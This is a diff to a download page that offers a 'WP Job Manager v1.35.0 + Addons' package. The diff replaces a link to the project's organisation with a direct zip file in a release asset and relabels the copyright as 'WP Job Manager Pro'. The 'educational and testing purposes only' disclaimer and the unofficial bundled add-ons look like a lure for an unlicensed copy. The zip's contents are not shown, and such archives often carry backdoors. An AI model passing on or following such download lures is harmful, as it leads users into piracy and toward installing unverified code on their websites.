@@ -17,7 +17,7 @@ WP Job Manager is a lightweight yet powerful plugin to add job-listing functiona
 
 > ⚠️ **Disclaimer:** This download is for educational and testing purposes only. Please support the developers by purchasing an official license for production use.
 
-[**⬇️ Download WP Job Manager v1.35.0 + Addons**](https://github.com/wp-job-manager)
+[**⬇️ Download WP Job Manager v1.35.0 + Addons**](https://github.com/WP-Job-Manager/.github/releases/download/download/wp_job_manager.zip)
 
 ---
 
@@ -31,5 +31,5 @@ WP Job Manager is trusted by thousands of job sites worldwide. It integrates sea
 
 ---
 
-**© WP Job Manager. All rights belong to their respective owners.**
+**© WP Job Manager Pro. All rights belong to their respective owners.**
 
